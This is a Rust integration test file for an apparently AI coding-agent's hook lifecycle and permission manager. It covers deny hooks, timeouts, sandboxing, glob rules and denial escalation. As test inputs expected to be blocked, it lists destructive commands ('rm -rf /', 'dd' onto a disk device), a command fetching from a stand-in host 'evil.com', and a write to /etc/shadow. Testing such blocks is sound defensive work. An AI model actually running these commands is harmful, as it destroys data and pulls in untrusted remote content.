//! End-to-end tests for the hook lifecycle and permission manager.
//!
//! Sprint 4 of the verification effort. Both surfaces had substantial
//! unit tests (hooks: 69, permissions: 80) but ZERO integration
//! coverage — no test exercised the wired-in interaction between a
//! `HookEngine` and a real subprocess (for command hooks) or between
//! a `PermissionManager` and a real allowlist update cycle.
//!
//! Coverage shape:
//!   - [`HookEngine::run`] with real shell commands written to a
//!     tempdir, asserting `allowed`, `outputs[].decision`, timeout
//!     enforcement, and matcher target discipline (crosslink #350).
//!   - `PreToolUse` deny short-circuit — a hook that prints
//!     `{"decision":"deny",...}` MUST flip `HookResult.allowed` to
//!     false; a downstream caller then refuses tool execution.
//!   - Timeout enforcement — a 60-second sleep hook with
//!     `timeout: 1` MUST be killed and reported as a `HookError::Timeout`
//!     within ~1.5s wall time.
//!   - [`PermissionManager::check`] against the documented
//!     decision-table: explicit allow/deny rules, no-match prompts,
//!     glob pattern matching against bash command strings and file
//!     paths.
//!   - `DenialTracker` escalation — consecutive + total denial counters
//!     cross [`MAX_CONSECUTIVE_DENIALS`] / [`MAX_TOTAL_DENIALS`]
//!     thresholds and `escalation_state` flips to `ShouldAbort`.
//!   - Exact approval persistence — a bounded receipt authorizes only the
//!     normalized invocation it records.

#![allow(clippy::missing_panics_doc)]
#![allow(clippy::expect_used)]
#![allow(clippy::unwrap_used)]

use openclaudia::config::{Hook, HookEntry, HookPolicy, HooksConfig, SandboxMode};
use openclaudia::hooks::{HookEngine, HookEvent, HookInput};
use openclaudia::permissions::{
    ApprovalProvenance, AuthorizationResult, CheckResult, EscalationState, PermissionDecision,
    PermissionManager, PermissionRule, MAX_CONSECUTIVE_DENIALS, MAX_TOTAL_DENIALS,
};
use openclaudia::tools::{FunctionCall, ToolCall};
use serde_json::json;
use std::time::Instant;
use tempfile::tempdir;

/// Build a `PermissionManager` with a tempdir-backed persistence path
/// so approval writes don't leak into the user's real rule store.
/// `enabled=true` so the manager actually evaluates rules;
/// `default_allow=[]` so we never get an unwanted `Allowed` result that
/// masks a regression.
fn fresh_manager() -> (PermissionManager, tempfile::TempDir) {
    let dir = tempfile::tempdir_in(".").expect("project-local tempdir");
    let path = dir.path().join("permissions.json");
    let mgr = PermissionManager::new(path, true, Vec::new());
    (mgr, dir)
}

// ───────────────────────────────────────────────────────────────────────────
// Helpers
// ───────────────────────────────────────────────────────────────────────────

/// Build a `HooksConfig` with a single command-hook entry for the
/// given event slot. The matcher is optional; absent matcher means
/// the entry fires on every event of that type.
fn config_with_command_hook(
    slot: HookSlot,
    matcher: Option<&str>,
    command: &str,
    timeout: u64,
) -> HooksConfig {
    let entry = HookEntry {
        matcher: matcher.map(str::to_string),
        hooks: vec![Hook::Command {
            command: command.to_string(),
            shell: true,
            timeout,
        }],
    };
    let mut cfg = HooksConfig::default();
    match slot {
        HookSlot::PreToolUse => cfg.pre_tool_use.push(entry),
        HookSlot::UserPromptSubmit => cfg.user_prompt_submit.push(entry),
        HookSlot::SessionStart => cfg.session_start.push(entry),
    }
    cfg
}

#[derive(Clone, Copy)]
enum HookSlot {
    PreToolUse,
    UserPromptSubmit,
    SessionStart,
}

// ───────────────────────────────────────────────────────────────────────────
// Section A — HookEngine command execution (real subprocesses)
// ───────────────────────────────────────────────────────────────────────────

#[tokio::test]
async fn command_hook_runs_and_returns_allowed_by_default() {
    let cfg = config_with_command_hook(HookSlot::SessionStart, None, "echo ok", 10);
    let engine = HookEngine::new(cfg);
    let input = HookInput::new(HookEvent::SessionStart);

    let result = engine.run(HookEvent::SessionStart, &input).await;
    assert!(
        result.allowed,
        "command hook printing nothing structured must default to allowed; errors={:?}",
        result.errors
    );
    // No structured deny → no decision in outputs.
    assert!(
        result
            .outputs
            .iter()
            .all(|o| o.decision.as_deref() != Some("deny")),
        "no hook decided deny, but outputs say: {:?}",
        result.outputs
    );
}

#[tokio::test]
#[cfg(target_os = "linux")]
async fn full_sandbox_hook_cannot_persist_host_temp_write() {
    let host_dir = tempdir().expect("full-sandbox host tempdir");
    let host_file = host_dir.path().join("escape.txt");
    let host_dir_text = host_dir.path().to_string_lossy();
    let host_file_text = host_file.to_string_lossy();
    let command = format!(
        "test \"$OPENCLAUDIA_SANDBOX\" = 1 && mkdir -p {host_dir_text} && \
         printf escaped > {host_file_text}"
    );
    let mut cfg = config_with_command_hook(HookSlot::SessionStart, None, &command, 10);
    cfg.policy = Some(HookPolicy {
        allowed_commands: None,
        sandbox: SandboxMode::FullSandbox,
    });
    let engine = HookEngine::new(cfg);
    let input = HookInput::new(HookEvent::SessionStart);

    let result = engine.run(HookEvent::SessionStart, &input).await;

    assert!(
        result.errors.is_empty(),
        "full sandbox hook should succeed in its private temp: {:?}",
        result.errors
    );
    assert!(
        !host_file.exists(),
        "full sandbox hook persisted a write to host temp"
    );
}

#[tokio::test]
async fn pretool_hook_deny_decision_flips_allowed_to_false() {
    // A PreToolUse hook that prints structured JSON with
    // {"decision":"deny",...} MUST cause HookResult.allowed = false.
    // The downstream caller (proxy/tool dispatcher) refuses tool
    // execution when allowed is false.
    let json_payload = r#"{"decision":"deny","reason":"blocked by test"}"#;
    let cfg = config_with_command_hook(
        HookSlot::PreToolUse,
        None,
        &format!("printf '%s' '{json_payload}'"),
        10,
    );
    let engine = HookEngine::new(cfg);
    let input = HookInput::new(HookEvent::PreToolUse).with_tool("Bash", json!({"command": "ls"}));

    let result = engine.run(HookEvent::PreToolUse, &input).await;
    assert!(
        !result.allowed,
        "deny-decision hook must flip allowed to false; got allowed=true, outputs={:?}, errors={:?}",
        result.outputs, result.errors,
    );
    assert!(
        result
            .outputs
            .iter()
            .any(|o| o.reason.as_deref() == Some("blocked by test")),
        "deny reason must be preserved in outputs: {:?}",
        result.outputs
    );
}

#[tokio::test]
async fn pretool_hook_with_non_matching_matcher_does_not_fire() {
    // matcher = "^Bash$", but the actual tool is "Write" — the hook
    // must NOT fire and result.allowed stays true even though the
    // hook would have denied if it had fired.
    let cfg = config_with_command_hook(
        HookSlot::PreToolUse,
        Some("^Bash$"),
        // If this fires, it denies. The test passes only when it
        // does NOT fire.
        r#"printf '{"decision":"deny","reason":"should not fire"}'"#,
        10,
    );
    let engine = HookEngine::new(cfg);
    let input =
        HookInput::new(HookEvent::PreToolUse).with_tool("Write", json!({"file_path": "/tmp/x"}));

    let result = engine.run(HookEvent::PreToolUse, &input).await;
    assert!(
        result.allowed,
        "matcher '^Bash$' must NOT match tool 'Write'; got allowed=false, outputs={:?}",
        result.outputs
    );
}

#[tokio::test]
async fn timeout_kills_long_running_hook_within_grace_window() {
    // 60-second sleep with timeout=1 must be killed within ~1.5s of
    // wall time, and the result must NOT carry a deny-decision (the
    // hook never got to print one).
    let cfg = config_with_command_hook(HookSlot::SessionStart, None, "sleep 60", 1);
    let engine = HookEngine::new(cfg);
    let input = HookInput::new(HookEvent::SessionStart);

    let start = Instant::now();
    let result = engine.run(HookEvent::SessionStart, &input).await;
    let elapsed = start.elapsed();

    assert!(
        elapsed.as_secs_f32() < 3.0,
        "timeout=1 must kill the hook well before 3s, took {elapsed:?}"
    );
    // The hook errored out. Either errors[] carries Timeout, OR
    // the engine treats the error as "allowed" (depends on policy).
    // We only require: the hook did NOT produce a deny decision
    // it never had time to write.
    assert!(
        result
            .outputs
            .iter()
            .all(|o| o.decision.as_deref() != Some("deny")),
        "timed-out hook must not appear to have voted deny; outputs={:?}",
        result.outputs
    );
}

#[tokio::test]
#[cfg(target_os = "linux")]
async fn timeout_kills_hook_descendants_before_they_can_escape_lifetime() {
    let dir = tempfile::tempdir_in(".").expect("project-local marker directory");
    let marker = dir.path().join("descendant-survived");
    let command = format!("(sleep 2; touch '{}') & sleep 60", marker.to_string_lossy());
    let cfg = config_with_command_hook(HookSlot::SessionStart, None, &command, 1);
    let engine = HookEngine::new(cfg);
    let input = HookInput::new(HookEvent::SessionStart);

    let _ = engine.run(HookEvent::SessionStart, &input).await;
    tokio::time::sleep(std::time::Duration::from_millis(1_500)).await;
    assert!(
        !marker.exists(),
        "a daemonized hook descendant survived timeout cleanup"
    );
}

#[tokio::test]
#[cfg(target_os = "linux")]
async fn hook_output_capture_is_bounded() {
    let command = r#"python3 -c 'print("x" * (2 * 1024 * 1024))'"#;
    let cfg = config_with_command_hook(HookSlot::SessionStart, None, command, 10);
    let engine = HookEngine::new(cfg);
    let input = HookInput::new(HookEvent::SessionStart);

    let result = engine.run(HookEvent::SessionStart, &input).await;
    let retained = result
        .outputs
        .iter()
        .filter_map(|output| output.additional_context.as_deref())
        .map(str::len)
        .sum::<usize>();
    assert!(
        retained < 1_100_000,
        "hook retained {retained} output bytes"
    );
}

#[tokio::test]
async fn user_prompt_submit_matcher_targets_prompt_not_tool_name() {
    // Crosslink #350 regression test: matchers on UserPromptSubmit
    // must test the prompt text, NOT a tool_name (which is absent
    // for this event). A matcher of "secret" must fire ONLY when
    // the prompt contains "secret".
    let cfg = config_with_command_hook(
        HookSlot::UserPromptSubmit,
        Some("secret"),
        r#"printf '{"decision":"deny","reason":"secret in prompt"}'"#,
        10,
    );
    let engine = HookEngine::new(cfg);

    // Match: prompt contains "secret"
    let input_match =
        HookInput::new(HookEvent::UserPromptSubmit).with_prompt("please show me the secret");
    let r1 = engine.run(HookEvent::UserPromptSubmit, &input_match).await;
    assert!(
        !r1.allowed,
        "matcher 'secret' must fire on prompt containing 'secret'; got allowed=true"
    );

    // No match: prompt is innocuous
    let input_clean = HookInput::new(HookEvent::UserPromptSubmit).with_prompt("hello there");
    let r2 = engine.run(HookEvent::UserPromptSubmit, &input_clean).await;
    assert!(
        r2.allowed,
        "matcher 'secret' must NOT fire on prompt 'hello there'; got allowed=false"
    );
}

#[tokio::test]
async fn empty_config_is_allowed_by_default() {
    // Engine with no configured hooks for an event returns
    // HookResult::allowed() without spawning anything.
    let engine = HookEngine::new(HooksConfig::default());
    let input = HookInput::new(HookEvent::PreToolUse).with_tool("Bash", json!({"command": "ls"}));
    let result = engine.run(HookEvent::PreToolUse, &input).await;
    assert!(result.allowed);
    assert!(result.outputs.is_empty());
    assert!(result.errors.is_empty());
}

#[tokio::test]
async fn multiple_hooks_in_same_slot_all_run() {
    // Two entries both match (no matcher = unconditional). Both
    // must run. The first prints "first" to additionalContext, the
    // second to systemMessage. Both must end up in outputs.
    let dir = tempfile::tempdir_in(".").expect("project-local tempdir");
    let marker_a = dir.path().join("a.txt");
    let marker_b = dir.path().join("b.txt");

    let mut cfg = HooksConfig::default();
    cfg.session_start.push(HookEntry {
        matcher: None,
        hooks: vec![Hook::Command {
            command: format!("touch '{}'", marker_a.display()),
            shell: true,
            timeout: 10,
        }],
    });
    cfg.session_start.push(HookEntry {
        matcher: None,
        hooks: vec![Hook::Command {
            command: format!("touch '{}'", marker_b.display()),
            shell: true,
            timeout: 10,
        }],
    });

    let engine = HookEngine::new(cfg);
    let input = HookInput::new(HookEvent::SessionStart);
    let _ = engine.run(HookEvent::SessionStart, &input).await;

    assert!(
        marker_a.exists(),
        "first hook must have run (marker {marker_a:?} missing)"
    );
    assert!(
        marker_b.exists(),
        "second hook must have run (marker {marker_b:?} missing)"
    );
}

// ───────────────────────────────────────────────────────────────────────────
// Section B — PermissionManager.check decision-table
// ───────────────────────────────────────────────────────────────────────────

// Notes on the registry layer:
// - `check()` keys into `tools::registry()` by the *registered* tool
//   name, which is lowercase snake_case ("bash", "write_file"). The
//   registry's mandatory effect spec then yields the *canonical* tool
//   label ("Bash", "Write") and concrete target that PermissionRule
//   matches (case-insensitive tool label; see `rule_matches`).
// - The declared target key for Bash is `"command"`; for write_file it
//   is `"path"` (NOT `"file_path"`, per crosslink #782).
// - Glob `*` matches one path segment (no `/`); use `**` to span
//   path separators.

#[test]
fn permission_check_no_rules_returns_needs_prompt() {
    let (mgr, _td) = fresh_manager();
    let r = mgr.check("bash", &json!({"command": "ls"}));
    assert!(
        matches!(r, CheckResult::NeedsPrompt { .. }),
        "no rules → must prompt; got {r:?}"
    );
}

#[test]
fn permission_check_explicit_allow_rule_returns_allowed() {
    let (mut mgr, _td) = fresh_manager();
    mgr.add_session_rule(PermissionRule {
        tool: "Bash".to_string(),
        pattern: "ls*".to_string(),
        decision: PermissionDecision::Allow,
    });
    let r = mgr.check("bash", &json!({"command": "ls -la"}));
    assert_eq!(
        r,
        CheckResult::Allowed,
        "explicit allow rule for 'ls*' must allow 'ls -la'"
    );
}

#[test]
fn permission_check_explicit_deny_rule_returns_denied() {
    let (mut mgr, _td) = fresh_manager();
    mgr.add_session_rule(PermissionRule {
        tool: "Bash".to_string(),
        // `**` matches `/` — needed because 'rm -rf /tmp/x' contains a slash.
        pattern: "rm**".to_string(),
        decision: PermissionDecision::Deny,
    });
    let r = mgr.check("bash", &json!({"command": "rm -rf /tmp/x"}));
    assert!(
        matches!(r, CheckResult::Denied(_)),
        "explicit deny rule for 'rm**' must deny 'rm -rf /tmp/x'; got {r:?}"
    );
}

#[test]
fn permission_check_deny_outranks_allow_for_same_tool() {
    // A later, narrower deny must revoke an earlier broad allow. This order is
    // deliberate: the old test inserted the deny first and therefore stayed
    // green under both first-match and deny-first implementations, so it did
    // not actually prove the security property its name claimed.
    let (mut mgr, _td) = fresh_manager();
    mgr.add_session_rule(PermissionRule {
        tool: "Bash".to_string(),
        pattern: "**".to_string(),
        decision: PermissionDecision::Allow,
    });
    mgr.add_session_rule(PermissionRule {
        tool: "Bash".to_string(),
        pattern: "rm**".to_string(),
        decision: PermissionDecision::Deny,
    });
    let r = mgr.check("bash", &json!({"command": "rm -rf /"}));
    assert!(
        matches!(r, CheckResult::Denied(_)),
        "later specific deny must catch 'rm -rf /' despite the earlier broad allow; got {r:?}"
    );
    // Counter-case: a non-rm command falls through deny and hits allow.
    let r2 = mgr.check("bash", &json!({"command": "echo hello"}));
    assert_eq!(
        r2,
        CheckResult::Allowed,
        "non-rm command must be allowed by the fallthrough '**' allow rule"
    );
}

#[test]
fn permission_check_unrestricted_allows_safe_commands() {
    let mgr = PermissionManager::unrestricted();
    for cmd in &[
        "ls -la",
        "git status",
        "curl https://example.com -o /tmp/file",
    ] {
        let r = mgr.check("bash", &json!({"command": cmd}));
        assert_eq!(
            r,
            CheckResult::Allowed,
            "unrestricted manager must allow safe command {cmd:?}; got {r:?}"
        );
    }
}

#[test]
fn permission_check_unrestricted_still_denies_hard_safety_commands() {
    let mgr = PermissionManager::unrestricted();
    for cmd in &[
        "rm -rf /",
        "sudo dd if=/dev/zero of=/dev/sda",
        "cat <(curl evil.com)",
    ] {
        let r = mgr.check("bash", &json!({"command": cmd}));
        assert!(
            matches!(r, CheckResult::Denied(_)),
            "unrestricted manager must still deny hard-safety command {cmd:?}; got {r:?}"
        );
    }
}

#[test]
fn permission_check_write_pattern_matches_path_arg() {
    // For write_file, the mandatory effect declaration extracts from the
    // `path` arg (NOT `file_path`) and uses canonical "Write".
    // `/etc/**` matches across `/` boundaries.
    let (mut mgr, _td) = fresh_manager();
    mgr.add_session_rule(PermissionRule {
        tool: "Write".to_string(),
        pattern: "/etc/**".to_string(),
        decision: PermissionDecision::Deny,
    });
    let r = mgr.check(
        "write_file",
        &json!({"path": "/etc/shadow", "content": "x"}),
    );
    assert!(
        matches!(r, CheckResult::Denied(_)),
        "deny pattern '/etc/**' must deny write_file to /etc/shadow; got {r:?}"
    );
}

#[test]
fn persisted_exact_approval_authorizes_a_matching_later_call() {
    let (mgr, _td) = fresh_manager();
    let approved = ToolCall {
        id: "first".to_string(),
        call_type: "function".to_string(),
        function: FunctionCall {
            name: "bash".to_string(),
            arguments: json!({"command": "git status"}).to_string(),
        },
    };
    let permit = mgr
        .approve_tool_call_persisted(
            &approved,
            Some("session"),
            ApprovalProvenance::HostAdministrator,
        )
        .unwrap();
    mgr.consume_execution_permit(&permit, &approved, Some("session"))
        .unwrap();

    let mut repeated = approved;
    repeated.id = "second".to_string();
    assert!(matches!(
        mgr.authorize_tool_call(&repeated, Some("session")),
        AuthorizationResult::Allowed(_)
    ));
    assert!(mgr.persisted_rules().is_empty());
}

// ───────────────────────────────────────────────────────────────────────────
// Section C — DenialTracker escalation
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn record_denial_escalates_strictly_past_max_consecutive() {
    // The contract (src/permissions.rs `escalation_state`): state
    // flips to ShouldAbort when `consecutive_denials > MAX_CONSECUTIVE`
    // (strictly greater, not >=). So with MAX=5, denials 1..=5 are
    // Normal and denial #6 flips to ShouldAbort.
    let (mut mgr, _td) = fresh_manager();
    for i in 1..=MAX_CONSECUTIVE_DENIALS {
        mgr.record_denial();
        assert_eq!(
            mgr.escalation_state(),
            EscalationState::Normal,
            "denial #{i} (= MAX_CONSECUTIVE_DENIALS) must still be Normal; \
             escalation triggers strictly past the cap"
        );
    }
    mgr.record_denial();
    assert_eq!(
        mgr.escalation_state(),
        EscalationState::ShouldAbort,
        "denial #{} (MAX_CONSECUTIVE_DENIALS + 1) MUST flip to ShouldAbort",
        MAX_CONSECUTIVE_DENIALS + 1
    );
}

#[test]
fn record_allowed_resets_consecutive_counter_only() {
    // record_allowed clears consecutive_denials but leaves
    // total_denials unchanged. The agent can recover from a deny
    // streak by getting an allow through.
    let (mut mgr, _td) = fresh_manager();
    for _ in 0..MAX_CONSECUTIVE_DENIALS {
        mgr.record_denial();
    }
    assert_eq!(mgr.consecutive_denials(), MAX_CONSECUTIVE_DENIALS);
    let total_before = mgr.total_denials();

    mgr.record_allowed();
    assert_eq!(
        mgr.consecutive_denials(),
        0,
        "record_allowed must zero the consecutive counter"
    );
    assert_eq!(
        mgr.total_denials(),
        total_before,
        "record_allowed must NOT touch the total counter"
    );
}

#[test]
fn record_denial_eventually_reaches_should_abort_via_total() {
    let (mut mgr, _td) = fresh_manager();
    // Strictly past MAX_TOTAL_DENIALS triggers ShouldAbort even when
    // the consecutive counter gets reset by interspersed allows.
    for _ in 0..=MAX_TOTAL_DENIALS {
        mgr.record_denial();
        mgr.record_allowed(); // resets consecutive but not total
    }
    assert_eq!(
        mgr.escalation_state(),
        EscalationState::ShouldAbort,
        "past MAX_TOTAL_DENIALS ({MAX_TOTAL_DENIALS}), state MUST be ShouldAbort \
         even with consecutive reset to zero each iteration",
    );
    assert_eq!(
        mgr.consecutive_denials(),
        0,
        "consecutive counter should be zero after final record_allowed"
    );
}

#[test]
fn clearing_compatibility_session_rules_does_not_clear_exact_receipts() {
    let (mut mgr, _td) = fresh_manager();
    let approved = ToolCall {
        id: "persisted".to_string(),
        call_type: "function".to_string(),
        function: FunctionCall {
            name: "bash".to_string(),
            arguments: json!({"command": "git status"}).to_string(),
        },
    };
    let first = mgr
        .approve_tool_call_persisted(
            &approved,
            Some("session"),
            ApprovalProvenance::HostAdministrator,
        )
        .unwrap();
    mgr.consume_execution_permit(&first, &approved, Some("session"))
        .unwrap();
    mgr.add_session_rule(PermissionRule {
        tool: "Bash".to_string(),
        pattern: "ls*".to_string(),
        decision: PermissionDecision::Allow,
    });
    assert_eq!(mgr.session_rules().len(), 1);
    assert!(mgr.persisted_rules().is_empty());

    mgr.clear_session_rules();
    assert!(
        mgr.session_rules().is_empty(),
        "session rules must be cleared"
    );
    let mut repeated = approved;
    repeated.id = "after-clear".to_string();
    assert!(matches!(
        mgr.authorize_tool_call(&repeated, Some("session")),
        AuthorizationResult::Allowed(_)
    ));
}
